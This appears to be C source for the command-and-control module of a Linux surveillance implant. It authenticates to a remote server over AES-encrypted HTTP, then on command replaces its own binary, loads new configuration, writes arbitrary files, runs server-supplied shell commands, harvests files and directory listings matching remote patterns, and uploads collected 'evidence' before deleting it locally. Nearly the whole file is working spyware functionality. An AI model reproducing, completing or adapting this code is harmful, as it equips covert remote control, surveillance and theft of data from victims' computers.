#define _BSD_SOURCE

#define PROTO_ERR         ((uint32_t)0x00)
#define PROTO_OK          ((uint32_t)0x01)
#define PROTO_NO          ((uint32_t)0x02)
#define PROTO_UNINSTALL   ((uint32_t)0x0a)

#define PROTO_ID              ((uint32_t)0x0f)
#define PROTO_UPGRADE         ((uint32_t)0x16)
#define PROTO_CONF            ((uint32_t)0x07)
#define PROTO_DOWNLOAD        ((uint32_t)0x0c)
#define PROTO_UPLOAD          ((uint32_t)0x0d)
#define PROTO_FILESYSTEM      ((uint32_t)0x19)
#define PROTO_EXEC            ((uint32_t)0x1b)
#define PROTO_EVIDENCE_SIZE   ((uint32_t)0x0b)
#define PROTO_EVIDENCE        ((uint32_t)0x09)
#define PROTO_BYE             ((uint32_t)0x03)

#define BIO_DECRYPT 0
#define BIO_ENCRYPT 1

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <openssl/bio.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include <openssl/rand.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <curl/curl.h>
#include <glob.h>

#include "actionmanager.h"
#include "eventmanager.h"
#include "evidencemanager.h"
#include "module.h"
#include "exec.h"
#include "config.h"
#include "params.h"
#include "me.h"
#include "so.h"
#include "runtime.h"
#include "bioutils.h"

struct proto_ctx {
   CURL *curl;
   char host[256];
   unsigned char key[16];
   unsigned char iv[16];
   uint64_t time;
   struct {
      char upgrade;
      char conf;
      char filesystem;
      char download;
      char upload;
      char exec;
   } availables;
};
typedef struct proto_ctx PROTO_CTX;

int proto_auth(PROTO_CTX *proto_ctx);
int proto_id(PROTO_CTX *proto_ctx);
int proto_upgrade(PROTO_CTX *proto_ctx);
int proto_conf(PROTO_CTX *proto_ctx);
int proto_download(PROTO_CTX *proto_ctx);
int proto_upload(PROTO_CTX *proto_ctx);
int proto_exec(PROTO_CTX *proto_ctx);
int proto_filesystem(PROTO_CTX *proto_ctx);
int proto_sendevidence(PROTO_CTX *proto_ctx);
int proto_bye(PROTO_CTX *proto_ctx);
static int doreq(PROTO_CTX *proto_ctx, uint32_t command, BIO *bio_data);
static int filter(const struct dirent *de);
static size_t writefunc(char *ptr, size_t size, size_t nmemb, void *userdata);
static char *expandvars(char *s);

int am_synchronize(subaction_synchronize_t *s)
{
   PROTO_CTX proto_ctx;
   struct curl_slist *hdr = NULL;
   int ret = 0;

   debugme("[RUN] action synchronize\n");

   do {
      memset(&proto_ctx, 0x00, sizeof(proto_ctx));
      if(snprintf(proto_ctx.host, sizeof(proto_ctx.host), "%s", s->host) >= sizeof(proto_ctx.host)) break;
      if(!(proto_ctx.curl = curl_easy_init())) break;
      if(!(hdr = curl_slist_append(hdr, SO"Content-Type: application/octet-stream"))) break;
      if(!(hdr = curl_slist_append(hdr, SO"Expect:"))) break;
      if(curl_easy_setopt(proto_ctx.curl, CURLOPT_HTTPHEADER, hdr)) break;
      if(curl_easy_setopt(proto_ctx.curl, CURLOPT_COOKIEFILE, "")) break;
      if(curl_easy_setopt(proto_ctx.curl, CURLOPT_WRITEFUNCTION, writefunc)) break;
#ifdef DEBUG
      if(curl_easy_setopt(proto_ctx.curl, CURLOPT_VERBOSE, 1L)) break;
#endif

      ret = proto_auth(&proto_ctx);
      if(ret == PROTO_NO) {
         ret = -1;
         break;
      } else if(ret == PROTO_UNINSTALL) {
         ret = -2;
         break;
      } else if(ret == PROTO_ERR) {
         ret = -3;
         break;
      }

      ret = proto_id(&proto_ctx);
      debugme("proto_id=%d\n", ret);

      if(ret == -1) break;
      if(proto_ctx.availables.upgrade) if(proto_upgrade(&proto_ctx)) ret = 4;
      if(proto_ctx.availables.conf) {
         proto_conf(&proto_ctx);
         ret = 3;
      }
      if(proto_ctx.availables.download) proto_download(&proto_ctx);
      if(proto_ctx.availables.upload) proto_upload(&proto_ctx);
      if(proto_ctx.availables.exec) proto_exec(&proto_ctx);
      if(proto_ctx.availables.filesystem) proto_filesystem(&proto_ctx);
      proto_sendevidence(&proto_ctx);
   } while(0);

   if(ret != -3) {
      proto_bye(&proto_ctx);
   } else {
      ret = -1;
   }


   if(proto_ctx.curl) curl_easy_cleanup(proto_ctx.curl);
   if(hdr) curl_slist_free_all(hdr);

   return ret;
}

int BIO_write_int32(BIO *b, uint32_t i)
{
   return BIO_write(b, &i, sizeof(uint32_t));
}

int BIO_write_int64(BIO *b, uint64_t i)
{
   return BIO_write(b, &i, sizeof(uint64_t));
}

int BIO_write_string(BIO *b, char *s)
{
   int ret;

   ret = BIO_write_int32(b, (strlen(s) + 1) * 2);
   while(*s) {
      ret += BIO_write(b, s, 1);
      ret += BIO_write(b, "\0", 1);
      s++;
   }
   ret += BIO_write(b, "\0\0", 2);

   return ret;
}

uint32_t BIO_read_int(BIO *b)
{
   uint32_t ret;

   return (BIO_read(b, &ret, sizeof(ret)) == sizeof(ret)) ? ret : 0;
}

int BIO_read_string(BIO *b, char *s, int size)
{
   uint32_t len;
   uint16_t c;
   int ret = 1;
   char *p;
   
   if(size <= 0) return 0;

   len = BIO_read_int(b) / 2;

   p = s;

   while(len--) {
      if(BIO_read(b, &c, sizeof(c)) != sizeof(c)) {
         ret = 0;
         break;
      }

      if(!ret) continue;

      if((c < 0x0080) && (size > 1)) {
         *p++ = (char)c;
         size--;
      } else if((c < 0x0800) && (size > 2)) {
         *p++ = (char)(0xC0|(c>>6));
         *p++ = (char)(0x80|(c&0x3F));
         size -= 2;
      } else if(size > 3) {
         *p++ = (char)(0xE0|(c>>12));
         *p++ = (char)(0x80|((c>>6)&0x3F));
         *p++ = (char)(0x80|(c&0x3F));
         size -= 3;
      } else {
         ret = 0;
      }
   }

   if(!ret || ((p != s) && *--p)) {
      *s = '\0';
      ret = 0;
   } else {
      ret = strlen(s);
   }

   return ret;
}

int proto_auth(PROTO_CTX *proto_ctx)
{
   unsigned char devicekey[16], serverkey[16], nonce[16], end[16], sha[SHA_DIGEST_LENGTH];
   BIO *bio_req = NULL, *bio_resp = NULL, *bio_cipher = NULL, *bio_mem = NULL;
   int ret = PROTO_ERR, endlen;
   SHA_CTX sha_ctx;
   char *dataptr, url[256];
   long int datalen;

   do {
      if(RAND_pseudo_bytes(devicekey, sizeof(devicekey)) == -1) break;
      if(RAND_pseudo_bytes(nonce, sizeof(nonce)) == -1) break;
      if(RAND_pseudo_bytes(end, sizeof(end)) == -1) break;
      endlen = (time(NULL) % 15) + 1;

      if(!SHA1_Init(&sha_ctx)) break;
      if(!SHA1_Update(&sha_ctx, bps.build, 16)) break;
      if(!SHA1_Update(&sha_ctx, instance, 20)) break;
      if(!SHA1_Update(&sha_ctx, bps.subtype, 16)) break;
      if(!SHA1_Update(&sha_ctx, bps.confkey, 16)) break;
      if(!SHA1_Final(sha, &sha_ctx)) break;

      if(!(bio_req = BIO_new(BIO_s_mem()))) break;
      if(!(bio_cipher = BIO_new(BIO_f_cipher()))) break;
      memset(proto_ctx->iv, 0x00, sizeof(proto_ctx->iv));
      BIO_set_cipher(bio_cipher, EVP_get_cipherbyname(SO"aes-128-cbc"), bps.signature, proto_ctx->iv, BIO_ENCRYPT);
      BIO_push(bio_cipher, bio_req);

      if(BIO_write(bio_cipher, devicekey, sizeof(devicekey)) != sizeof(devicekey)) break;
      if(BIO_write(bio_cipher, nonce, sizeof(nonce)) != sizeof(nonce)) break;
      if(BIO_write(bio_cipher, bps.build, 16) != 16) break;
      if(BIO_write(bio_cipher, instance, 20) != 20) break;
      if(BIO_write(bio_cipher, bps.subtype, 16) != 16) break;
      if(BIO_write(bio_cipher, sha, sizeof(sha)) != sizeof(sha)) break;
      BIO_flush(bio_cipher);
      BIO_pop(bio_cipher);
      if(BIO_write(bio_req, end, endlen) != endlen) break;
      BIO_flush(bio_req);
      
      if(snprintf(url, sizeof(url), SO"http://%s/index.html", proto_ctx->host) >= sizeof(url)) break;
      if(!(datalen = BIO_get_mem_data(bio_req, &dataptr))) break;
      if(!(bio_resp = BIO_new(BIO_s_mem()))) break;
      if(curl_easy_setopt(proto_ctx->curl, CURLOPT_URL, url)) break;
      if(curl_easy_setopt(proto_ctx->curl, CURLOPT_POSTFIELDS, dataptr)) break;
      if(curl_easy_setopt(proto_ctx->curl, CURLOPT_POSTFIELDSIZE, datalen)) break;
      if(curl_easy_setopt(proto_ctx->curl, CURLOPT_WRITEDATA, bio_resp)) break;
      if(curl_easy_perform(proto_ctx->curl)) break;
      if(!(datalen = BIO_get_mem_data(bio_resp, &dataptr))) break;

      if(!(bio_mem = BIO_new(BIO_s_mem()))) break;
      memset(proto_ctx->iv, 0x00, sizeof(proto_ctx->iv));
      BIO_set_cipher(bio_cipher, EVP_get_cipherbyname(SO"aes-128-cbc"), bps.signature, proto_ctx->iv, BIO_DECRYPT);
      BIO_push(bio_cipher, bio_mem);

      if(BIO_write(bio_cipher, dataptr, 32) != 32) break;
      BIO_flush(bio_cipher);
      if(BIO_read(bio_mem, serverkey, sizeof(serverkey)) != sizeof(serverkey)) break;

      if(!SHA1_Init(&sha_ctx)) break;
      if(!SHA1_Update(&sha_ctx, bps.confkey, 16)) break;
      if(!SHA1_Update(&sha_ctx, serverkey, sizeof(serverkey))) break;
      if(!SHA1_Update(&sha_ctx, devicekey, sizeof(devicekey))) break;
      if(!SHA1_Final(proto_ctx->key, &sha_ctx)) break;

      if(BIO_reset(bio_mem) == -1) break;
      memset(proto_ctx->iv, 0x00, sizeof(proto_ctx->iv));
      BIO_set_cipher(bio_cipher, EVP_get_cipherbyname(SO"aes-128-cbc"), proto_ctx->key, proto_ctx->iv, BIO_DECRYPT);

      if(BIO_write(bio_cipher, dataptr + 32, datalen - 32) != (datalen - 32)) break;
      BIO_flush(bio_cipher);
      if((datalen = BIO_get_mem_data(bio_mem, &dataptr)) < (sizeof(nonce) + sizeof(ret))) break;
      if(memcmp(nonce, dataptr, sizeof(nonce))) break;

      ret = *((unsigned int *)(dataptr + sizeof(nonce)));
   } while(0);

   if(bio_req) BIO_free(bio_req);
   if(bio_resp) BIO_free(bio_resp);
   if(bio_cipher) BIO_free(bio_cipher);
   if(bio_mem) BIO_free(bio_mem);

   return ret;
}

int proto_id(PROTO_CTX *proto_ctx)
{
   BIO *bio_data = NULL;
   char *dataptr = NULL;
   long int datalen;
   int ret = PROTO_ERR;

   int num, i;

   do {
      if(!(bio_data = BIO_new(BIO_s_mem()))) break;

      BIO_write_int32(bio_data, bps.version);
      BIO_write_string(bio_data, user);
      BIO_write_string(bio_data, host);
      BIO_write_string(bio_data, "");

      if((ret = doreq(proto_ctx, PROTO_ID, bio_data)) != PROTO_OK) break;
      if(!(datalen = BIO_get_mem_data(bio_data, &dataptr))) break;

      proto_ctx->time = *((uint64_t *)dataptr);
      dataptr += sizeof(proto_ctx->time);
      num = *((int *)dataptr);
      dataptr += sizeof(num);

      for(i = 0; i < num; i++) {
         switch(*(((uint32_t *)dataptr) + i)) {
            case PROTO_UPGRADE:
               proto_ctx->availables.upgrade = 1;
               break;
            case PROTO_CONF:
               proto_ctx->availables.conf = 1;
               break;
            case PROTO_DOWNLOAD:
               proto_ctx->availables.download = 1;
               break;
            case PROTO_UPLOAD:
               proto_ctx->availables.upload = 1;
               break;
            case PROTO_EXEC:
               proto_ctx->availables.exec = 1;
               break;
            case PROTO_FILESYSTEM:
               proto_ctx->availables.filesystem = 1;
               break;
         }
      }
   } while(0);

   if(bio_data) BIO_free(bio_data);

   return 0;
}

int proto_upgrade(PROTO_CTX *proto_ctx)
{
   BIO *bio_data = NULL, *bio_file = NULL;
   int ret, val = PROTO_ERR;
   char *ptr;
   uint32_t left;
   char name[512];

   debugme("PROTO_UPGRADE\n");

   do {
      if(!(bio_data = BIO_new(BIO_s_mem()))) break;
      if((ret = doreq(proto_ctx, PROTO_UPGRADE, bio_data)) != PROTO_OK) break;

      left = BIO_read_int(bio_data);
      BIO_read_string(bio_data, name, sizeof(name));
      ret = BIO_get_mem_data(bio_data, &ptr);

      debugme("upgrade file %s (%d left)\n", name, left);

      if(!(bio_file = BIO_new_file(name, "w"))) return PROTO_ERR;
      BIO_write(bio_file, ptr + sizeof(left), ret - sizeof(left));
      BIO_free(bio_file);
      BIO_free(bio_data);
      chmod(name, 0755);
      if(!strcmp(name, SO"core32") && (BITS == 32)) {
         rename(name, binaryname);
         val = 4;
      } else if(!strcmp(name, SO"core64") && (BITS == 64)) {
         rename(name, binaryname);
         val = 4;
      } else {
         unlink(name);
      }
   } while(left);

   return val;
}

int proto_conf(PROTO_CTX *proto_ctx)
{
   BIO *bio_data = NULL, *bio_file = NULL;
   int ret = PROTO_ERR;
   long int datalen;
   char *dataptr = NULL;

   debugme("|> CONF begin\n");

   do {
      if(!(bio_data = BIO_new(BIO_s_mem()))) break;
      if((ret = doreq(proto_ctx, PROTO_CONF, bio_data)) != PROTO_OK) break;
      ret = PROTO_ERR;
      if(!(datalen = BIO_get_mem_data(bio_data, &dataptr))) break;
      if(!(bio_file = BIO_new_file(SO".cache", "w"))) break;
      if(BIO_write(bio_file, dataptr, datalen) != datalen) break;
      BIO_free(bio_file);
      bio_file = NULL;

      am_stopqueue(QUEUE_FAST);
      stopmodule(MODULE_ALL_INDEX);
      parseconfig(SO".cache");

      if(BIO_reset(bio_data) == -1) break;

      BIO_write_int32(bio_data, PROTO_OK);
      if((ret = doreq(proto_ctx, PROTO_CONF, bio_data)) != PROTO_OK) break;
   } while(0);

   if(bio_data) BIO_free(bio_data);
   if(bio_file) BIO_free(bio_file);

   debugme("|> CONF end (%d)\n", ret);

   return ret;
}

int proto_download(PROTO_CTX *proto_ctx)
{
   BIO *bio_data = NULL, *bio_file = NULL;
   uint32_t num;
   char name[512], buf[4096], *expand = NULL;
   int ret = PROTO_ERR, chunk;
   glob_t globbuf;
   struct stat s;
   BIO *bio_additional = NULL, *bio_content = NULL;
   char *additionalptr = NULL, *contentptr = NULL;
   long int additionallen = 0, contentlen = 0;
   int version = 2008122901;
   int i, filenamesize;

   debugme("|> DOWNLOAD begin\n");

   do {
      if(!(bio_data = BIO_new(BIO_s_mem()))) break;
      if((ret = doreq(proto_ctx, PROTO_DOWNLOAD, bio_data)) != PROTO_OK) break;

      num = BIO_read_int(bio_data);
      debugme("Processing %u pattern(s)\n", num);

      while(num--) {
         BIO_read_string(bio_data, name, sizeof(name));
         expand = expandvars(name);
         strncpy(name, expand, sizeof(name) - 1);
         name[sizeof(name) - 1] = '\0';
         free(expand);
         debugme("- Pattern: %s\n", name);

         memset(&globbuf, 0x00, sizeof(globbuf));
         if(glob(name, GLOB_NOSORT|GLOB_TILDE|GLOB_PERIOD, NULL, &globbuf)) continue;
         for(i = 0; i < globbuf.gl_pathc; i++) {
            do {
               if(stat(globbuf.gl_pathv[i], &s) || !S_ISREG(s.st_mode)) continue;
               debugme("--- %s\n", globbuf.gl_pathv[i]);
               if(!(bio_file = BIO_new_file(globbuf.gl_pathv[i], "r"))) break;
               if(!(bio_content = BIO_new(BIO_s_mem()))) break;
               if(!(bio_additional = BIO_new(BIO_s_mem()))) break;
               while(!BIO_eof(bio_file)) {
                  chunk = BIO_read(bio_file, buf, sizeof(buf));
                  BIO_write(bio_content, buf, chunk);
               }
               filenamesize = strlen16(globbuf.gl_pathv[i]);
               BIO_write(bio_additional, &version, 4);
               BIO_write(bio_additional, &filenamesize, 4);
               BIO_puts16(bio_additional, globbuf.gl_pathv[i]);

               contentlen = BIO_get_mem_data(bio_content, &contentptr);
               if(!(additionallen = BIO_get_mem_data(bio_additional, &additionalptr))) break;
               evidence_write(EVIDENCE_TYPE_DOWNLOAD, additionalptr, additionallen, contentptr, contentlen);
            } while(0);
            if(bio_file) { BIO_free(bio_file); bio_file = NULL; }
            if(bio_content) { BIO_free(bio_content); bio_content = NULL; }
            if(bio_additional) { BIO_free(bio_additional); bio_additional = NULL; }
         }
         globfree(&globbuf);
      }
   } while(0);
   if(bio_data) BIO_free(bio_data);

   debugme("|> DOWNLOAD end (%d)\n", ret);

   return ret;
}

int proto_upload(PROTO_CTX *proto_ctx)
{
   BIO *bio_data = NULL, *bio_file = NULL;
   int ret = PROTO_ERR;
   char *dataptr;
   long datalen;
   uint32_t left;
   char name[512];

   debugme("|> UPLOAD begin\n");

   do {
      if(!(bio_data = BIO_new(BIO_s_mem()))) break;
      do {
         BIO_reset(bio_data);
         if((ret = doreq(proto_ctx, PROTO_UPLOAD, bio_data)) != PROTO_OK) break;

         left = BIO_read_int(bio_data);
         BIO_read_string(bio_data, name, sizeof(name));
         datalen = BIO_get_mem_data(bio_data, &dataptr);

         debugme("- Upload: %s [%d] (%d left)\n", name, datalen - 4, left);

         if(!(bio_file = BIO_new_file(name, "w"))) continue;
         BIO_write(bio_file, dataptr + 4, datalen - 4);
         BIO_free(bio_file);
         chmod(name, 0755);
      } while(left);
   } while(0);
   if(bio_data) BIO_free(bio_data);

   return 0;
}

int proto_exec(PROTO_CTX *proto_ctx)
{
   BIO *bio_data = NULL;
   uint32_t num;
   char name[512], *expand = NULL;
   int ret = PROTO_ERR;

   debugme("|> EXEC begin\n");

   do {
      if(!(bio_data = BIO_new(BIO_s_mem()))) break;
      if((ret = doreq(proto_ctx, PROTO_EXEC, bio_data)) != PROTO_OK) break;

      num = BIO_read_int(bio_data);
      debugme("Processing %u command(s)\n", num);

      while(num--) {
         BIO_read_string(bio_data, name, sizeof(name));
         expand = expandvars(name);
         strncpy(name, expand, sizeof(name) - 1);
         name[sizeof(name) - 1] = '\0';
         free(expand);
         debugme("- Command: %s\n", name);
         exec(name);
      }
   } while(0);
   if(bio_data) BIO_free(bio_data);

   debugme("|> EXEC end (%d)\n", ret);

   return ret;
}

int proto_filesystem(PROTO_CTX *proto_ctx)
{
   BIO *bio_data = NULL;
   int ret = PROTO_ERR;
   uint32_t num, depth;
   char name[512], *expand = NULL;
   glob_t globbuf;
   int i, j, filenamelen, flags, version = 2010031501;
   unsigned int filesizelow, filesizehigh, filetimelow, filetimehigh;
   struct stat s;
   char *entry = NULL;
   BIO *bio_content = NULL;
   char *contentptr = NULL;
   long int contentlen;
   unsigned long long int ts;

   debugme("|> FILESYSTEM begin\n");

   do {
      if(!(bio_data = BIO_new(BIO_s_mem()))) break;
      if((ret = doreq(proto_ctx, PROTO_FILESYSTEM, bio_data) != PROTO_OK)) break;

      num = BIO_read_int(bio_data);
      debugme("Processing %u pattern(s)\n", num);

      if(!(bio_content = BIO_new(BIO_s_mem()))) break;

      while(num--) {
         depth = BIO_read_int(bio_data);
         BIO_read_string(bio_data, name, sizeof(name));
         expand = expandvars(name);
         strncpy(name, expand, sizeof(name) - 1);
         name[sizeof(name) - 1] = '\0';
         free(expand);
         if(name[0] && name[strlen(name) - 1] == '*') name[strlen(name) - 1] = '\0';
         if(strcmp(name, "/") && (name[strlen(name) - 1] == '/')) name[strlen(name) - 1] = '\0';
         debugme("- Pattern: %s (depth: %u)\n", name, depth);

         memset(&globbuf, 0x00, sizeof(globbuf));
         if(glob(name, GLOB_NOSORT|GLOB_TILDE|GLOB_PERIOD, NULL, &globbuf)) continue;
         while(depth--) {
            strncat(name, "/*", sizeof(name) - strlen(name) - 1);
            if(glob(name, GLOB_NOSORT|GLOB_TILDE|GLOB_PERIOD|GLOB_APPEND, NULL, &globbuf)) continue;
         }
         for(i = 0; i < globbuf.gl_pathc; i++) {
            entry = globbuf.gl_pathv[i];
            if(stat(entry, &s) || !(S_ISREG(s.st_mode) || S_ISDIR(s.st_mode))) continue;
            if(S_ISDIR(s.st_mode) && (((strlen(entry) >= 2) && !strcmp(entry + strlen(entry) - 2, "/.")) || ((strlen(entry) >= 3) && !strcmp(entry + strlen(entry) - 3, "/..")))) continue;
            filenamelen = strlen16(entry);
            ts = ((unsigned long long int)s.st_mtime + 11644473600LL) * 10000000LL;
            filetimehigh = (unsigned int)((ts>>32) & 0x00000000FFFFFFFFLL);
            filetimelow = (unsigned int)(ts & 0x00000000FFFFFFFFLL);
            if(S_ISDIR(s.st_mode)) {
               filesizelow = 0;
               filesizehigh = 0;
               for(j = i + 1, flags = 1; j < globbuf.gl_pathc; j++) {
                  if(strncmp(entry, globbuf.gl_pathv[j], strlen(entry))) continue;
                  if(!strcmp(globbuf.gl_pathv[j] + strlen(entry), "/.") || !strcmp(globbuf.gl_pathv[j] + strlen(entry), "/..")) {
                     flags = 3;
                  } else {
                     flags = 1;
                     break;
                  }
               }
            } else {
               filesizelow = (unsigned int)(s.st_size & 0x00000000FFFFFFFFLL);
               filesizehigh = (unsigned int)((s.st_size>>32) & 0x00000000FFFFFFFFLL);
               flags = 0;
            }
            debugme("--- [%c] %s\n", (flags&1) ? ((flags&2) ? 'E' : 'D') : 'F', entry);
            BIO_write(bio_content, &version, 4);
            BIO_write(bio_content, &filenamelen, 4);
            BIO_write(bio_content, &flags, 4);
            BIO_write(bio_content, &filesizelow, 4);
            BIO_write(bio_content, &filesizehigh, 4);
            BIO_write(bio_content, &filetimelow, 4);
            BIO_write(bio_content, &filetimehigh, 4);
            BIO_puts16(bio_content, entry);
         }
         globfree(&globbuf);
      }

      if(!(contentlen = BIO_get_mem_data(bio_content, &contentptr))) break;
      evidence_write(EVIDENCE_TYPE_FILESYSTEM, NULL, 0, contentptr, contentlen);
   } while(0);
   if(bio_data) BIO_free(bio_data);
   if(bio_content) BIO_free(bio_content);

   debugme("|> FILESYSTEM end (%d)\n", ret);

   return ret;
}

int proto_sendevidence(PROTO_CTX *proto_ctx)
{
   BIO *bio_data = NULL;
   int ret = PROTO_ERR, len;

   struct stat s;
   FILE *fp = NULL;
   char buf[1024];
   int n = 0, i;
   uint64_t size = 0;
   struct dirent **de = NULL;

   debugme("|> EVIDENCE begin\n");

   do {
      flushmodule(MODULE_ALL_INDEX);

      if(!(bio_data = BIO_new(BIO_s_mem()))) break;

      if((n = scandir(".", &de, filter, alphasort)) <= 0) break;
      for(i = 0; i < n; i++) if(stat(de[i]->d_name, &s) != -1) size += (uint64_t)s.st_size;
      BIO_write_int32(bio_data, n);
      BIO_write_int64(bio_data, size);
      debugme("Sending %d evidences (%llu bytes)\n", n, size);
      if((ret = doreq(proto_ctx, PROTO_EVIDENCE_SIZE, bio_data)) != PROTO_OK) break;

      for(i = 0; i < n; i++)  {
         if(BIO_reset(bio_data) == -1) break;
         if(stat(de[i]->d_name, &s) == -1) break;
         if(!(fp = fopen(de[i]->d_name, "r"))) break;
         debugme("sending evidence %d/%d -> %s\n", i + 1, n, de[i]->d_name);

         BIO_write_int32(bio_data, s.st_size);
         while((len = fread(buf, 1, sizeof(buf), fp))) {
            if(BIO_write(bio_data, buf, len) != len) break;
         }
         if(!feof(fp)) break;
         fclose(fp);
         fp = NULL;

         if((ret = doreq(proto_ctx, PROTO_EVIDENCE, bio_data)) != PROTO_OK) break;
         debugme("done evidence %d/%d (%d)-> %s\n", i + 1, n, ret, de[i]->d_name);

         unlink(de[i]->d_name);
      }
   } while(0);

   if(bio_data) BIO_free(bio_data);
   if(fp) fclose(fp);
   if(de) {
      for(i = 0; i < n; i++) free(de[i]);
      free(de);
   }

   debugme("|> EVIDENCE end (%d)\n", ret);

   return ret;
}

int proto_bye(PROTO_CTX *proto_ctx)
{
   BIO *bio_data = NULL;
   int ret = PROTO_ERR;

   debugme("|> BYE begin\n");

   do {
      if(!(bio_data = BIO_new(BIO_s_mem()))) break;
      if((ret = doreq(proto_ctx, PROTO_BYE, bio_data)) != PROTO_OK) break;
   } while(0);

   if(bio_data) BIO_free(bio_data);

   debugme("|> BYE end (%d)\n", ret);

   return ret;
}

/* mancano i controlli d'errore sui valori di ritorno */
static int doreq(PROTO_CTX *proto_ctx, uint32_t command, BIO *bio_data)
{
   BIO *bio_req = NULL, *bio_resp = NULL, *bio_cipher = NULL, *bio_md = NULL;
   char url[256], *data = NULL, sha[SHA_DIGEST_LENGTH], check[SHA_DIGEST_LENGTH];
   uint32_t len = 0, cmd;
   int ret = PROTO_ERR;
   unsigned char end[16];
   int endlen;
   char *dataptr;
   long int datalen = 0;

   do {
      if(bio_data) {
         BIO_flush(bio_data);
         datalen = BIO_get_mem_data(bio_data, &dataptr);
      }

      if(RAND_pseudo_bytes(end, sizeof(end)) == -1) break;
      endlen = (time(NULL) % 15) + 1;

      if(!(bio_req = BIO_new(BIO_s_mem()))) break;
      if(!(bio_cipher = BIO_new(BIO_f_cipher()))) break;
      if(!(bio_md = BIO_new(BIO_f_md()))) break;
      memset(proto_ctx->iv, 0x00, sizeof(proto_ctx->iv));
      BIO_set_cipher(bio_cipher, EVP_get_cipherbyname(SO"aes-128-cbc"), proto_ctx->key, proto_ctx->iv, BIO_ENCRYPT);
      if(!BIO_set_md(bio_md, EVP_sha1())) break;
      BIO_push(bio_cipher, bio_req);
      BIO_push(bio_md, bio_cipher);

      /* TODO XXX controllare valori di ritorno */
      BIO_write_int32(bio_md, command);
      if(datalen) BIO_write(bio_md, dataptr, datalen);
      BIO_gets(bio_md, sha, sizeof(sha));
      BIO_pop(bio_md);
      BIO_write(bio_cipher, sha, sizeof(sha));
      BIO_flush(bio_cipher);
      BIO_pop(bio_cipher);
      BIO_write(bio_req, end, endlen);
      BIO_flush(bio_req);
      /* * * * */

      if(snprintf(url, sizeof(url), SO"http://%s/index.html", proto_ctx->host) >= sizeof(url)) break;
      if(!(datalen = BIO_get_mem_data(bio_req, &dataptr))) break;
      if(!(bio_resp = BIO_new(BIO_s_mem()))) break;
      if(curl_easy_setopt(proto_ctx->curl, CURLOPT_URL, url)) break;
      if(curl_easy_setopt(proto_ctx->curl, CURLOPT_POSTFIELDS, dataptr)) break;
      if(curl_easy_setopt(proto_ctx->curl, CURLOPT_POSTFIELDSIZE, datalen)) break;
      if(curl_easy_setopt(proto_ctx->curl, CURLOPT_WRITEDATA, bio_resp)) break;
      if(curl_easy_perform(proto_ctx->curl)) break;

      if(BIO_write(bio_resp, SO"ADDITIONALBLOCK", 16) != 16) break;
      if(BIO_reset(bio_data) != 1) break;
      if(BIO_reset(bio_md) != 0) break;
      memset(proto_ctx->iv, 0x00, sizeof(proto_ctx->iv));
      BIO_set_cipher(bio_cipher, EVP_get_cipherbyname(SO"aes-128-cbc"), proto_ctx->key, proto_ctx->iv, BIO_DECRYPT);
      BIO_push(bio_cipher, bio_resp);
      BIO_push(bio_md, bio_cipher);

      if(BIO_read(bio_md, &cmd, sizeof(cmd)) != sizeof(cmd)) break;
      if(cmd == PROTO_OK) {
         if(BIO_read(bio_md, &len, sizeof(len)) != sizeof(len)) break;
         if(len) {
            if(!(data = malloc(len))) break;
            if(BIO_read(bio_md, data, len) != len) break;
            if(BIO_write(bio_data, data, len) != len) break;
         }
      }
      if(BIO_gets(bio_md, sha, sizeof(sha)) != sizeof(sha)) break;
      if(BIO_read(bio_cipher, check, sizeof(check)) != sizeof(check)) break;
      if(memcmp(sha, check, sizeof(sha))) break;

      ret = cmd;
   } while(0);

   if(bio_req) BIO_free(bio_req);
   if(bio_resp) BIO_free(bio_resp);
   if(bio_cipher) BIO_free(bio_cipher);
   if(bio_md) BIO_free(bio_md);
   if(data) free(data);

   return ret;
}

static int filter(const struct dirent *de)
{
   struct stat s;

   return ((!stat(de->d_name, &s) && (s.st_mode & S_IFREG) && (s.st_mode & S_ISVTX)) ? 1 : 0);
}

static size_t writefunc(char *ptr, size_t size, size_t nmemb, void *userdata)
{
   return BIO_write((BIO *)userdata, ptr, nmemb * size);
}

char *expandvars(char *s)
{
   BIO *b = NULL;
   char *bptr = NULL, *ret = NULL;
   char *var = NULL, *env = NULL, c;

   do {
      if(!s) break;
      if(!(b = BIO_new(BIO_s_mem()))) break;

      if(!strcasecmp(s, SO"%userprofile%")) {
         if((var = getenv(SO"HOME"))) {
            BIO_puts(b, var);
         }
         s += 13;
      }

      if(!strncasecmp(s, SO"$dir$", 5)) {
         if((var = getcwd(NULL, 0))) {
            BIO_puts(b, var);
            free(var);
         }
         s += 5;
      }

      while(*s) {
         switch(*s) {
            case '\\':
               BIO_write(b, s++, 1);
               if(*s) BIO_write(b, s++, 1);
               break;
            case '$':
               if(sscanf(s, SO"${%m[a-zA-Z0-9_]%[}]", &var, &c) == 2) {
                  if((env = getenv(var))) BIO_puts(b, env);
                  s += (strlen(var) + 3);
               } else if(sscanf(s, SO"$%m[a-zA-Z0-9_]", &var) == 1) {
                  if((env = getenv(var))) BIO_puts(b, env);
                  s += (strlen(var) + 1);
               } else {
                  BIO_write(b, s++, 1);
               }
               break;
            default:
               BIO_write(b, s++, 1);
               break;
         }
      }
      BIO_write(b, "\0", 1);

      if(BIO_get_mem_data(b, &bptr) > 0) ret = strdup(bptr);
   } while(0);
   if(b) BIO_free(b);

   return ret ? ret : strdup(s);
}

